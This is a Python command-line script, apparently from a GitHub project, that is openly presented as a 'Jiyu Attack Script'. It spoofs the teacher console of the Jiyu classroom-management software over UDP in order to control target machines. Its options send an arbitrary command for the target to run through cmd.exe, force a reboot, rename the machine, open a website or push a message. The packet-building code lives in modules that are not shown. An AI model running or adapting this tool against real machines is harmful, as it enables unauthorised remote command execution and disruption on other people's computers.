# pylint: disable=all

"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import argparse
from os import name

from sender import broadcast_packet
from packet import pkg_message, pkg_reboot, pkg_rename, pkg_website, pkg_execute


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Jiyu Attack Script",
        epilog="Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/",
    )
    parser.add_argument(
        "-s",
        "--teacher-ip",
        type=str,
        required=True,
        help="Teacher's IP address",
    )
    parser.add_argument(
        "-f",
        "--teacher-port",
        type=int,
        default=None,
        help="Teacher's port (default to random port)",
    )
    parser.add_argument(
        "-t",
        "--target",
        type=str,
        required=True,
        help="Target IP address",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=4705,
        help="Port to send packets to (default: 4705)",
    )
    parser.add_argument(
        "-i",
        "--ip-id",
        type=int,
        default=None,
        help="IP ID for the packet (default: random ID)",
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "-m",
        "--message",
        type=str,
        help="Message to send",
    )
    group.add_argument(
        "-w",
        "--website",
        type=str,
        help="Website URL to ask to open",
    )
    group.add_argument(
        "-c",
        "--command",
        type=str,
        help="Command to execute on the target",
    )
    group.add_argument(
        "-r",
        "--reboot",
        nargs="*",
        default=None,
        metavar="timeout [message]",
        help="Reboot the target machine, optionally with a timeout and message",
    )
    group.add_argument(
        "-n",
        "--rename",
        nargs=2,
        metavar=("name", "name_id"),
        help="Rename the target machine",
    )

    args = parser.parse_args()
    teacher_ip = args.teacher_ip
    teacher_port = args.teacher_port
    target = args.target
    port = args.port

    try:
        if args.message:
            payload = pkg_message(args.message)
        elif args.website:
            payload = pkg_website(args.website)
        elif args.command:
            payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
        elif args.reboot is not None:
            match args.reboot:
                case []:
                    payload = pkg_reboot()
                case [timeout]:
                    payload = pkg_reboot(timeout=int(timeout))
                case [timeout, message]:
                    payload = pkg_reboot(timeout=int(timeout), message=message)
                case _:
                    parser.error("Invalid reboot arguments: expected [timeout] or [timeout, message]")
        elif args.rename:
            name, name_id = args.rename
            payload = pkg_rename(name, int(name_id))
        else:
            raise ValueError("Either message or website must be provided")

        broadcast_packet(teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id)
        print(f"Packet sent to {target} on port {port} with payload length {len(payload)} bytes")
    except Exception as e:
        parser.error(f"({e.__class__.__name__}) {e}")
